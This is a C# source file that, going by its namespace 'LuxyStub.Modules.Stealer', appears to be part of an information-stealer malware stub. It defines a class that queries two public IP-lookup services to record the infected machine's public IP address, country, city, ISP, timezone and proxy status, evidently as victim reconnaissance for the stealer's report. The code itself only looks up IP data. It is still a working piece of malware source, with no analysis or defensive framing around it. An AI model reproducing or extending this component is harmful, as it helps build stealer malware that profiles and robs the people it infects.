using System.Net.Http;
using System.Threading.Tasks;

namespace LuxyStub.Modules.Stealer.Components.SystemInfo
{
    internal class IpFormat
    {
        public string Country { get; set; }
        public string RegionName { get; set; }
        public string City { get; set; }
        public string Org { get; set; }
        public string Timezone { get; set; }
        public string Reverse { get; set; }
        public bool Mobile { get; set; }
        public bool Proxy { get; set; }
        public string Query { get; set; }
    }

    internal static class IpInfo
    {
        internal static async Task<IpFormat> GetInfo()
        {
            using (HttpClient client = new HttpClient())
            {
                string content = await client.GetStringAsync("http://ip-api.com/json/?fields=225545");
                string content2 = await client.GetStringAsync("http://ipinfo.io/json");
                dynamic jsonContent = SimpleJson.DeserializeObject(content);
                dynamic jsonContent2 = SimpleJson.DeserializeObject(content2);

                IpFormat ipinfo = new IpFormat
                {
                    Country = (string)jsonContent2["country"],
                    RegionName = (string)jsonContent2["region"],
                    City = (string)jsonContent2["city"],
                    Org = (string)jsonContent2["org"],
                    Timezone = (string)jsonContent["timezone"],
                    Reverse = (string)jsonContent["reverse"],
                    Mobile = (bool)jsonContent["mobile"],
                    Proxy = (bool)jsonContent["proxy"],
                    Query = (string)jsonContent["query"]
                };

                return ipinfo;
            }
        }
    }
}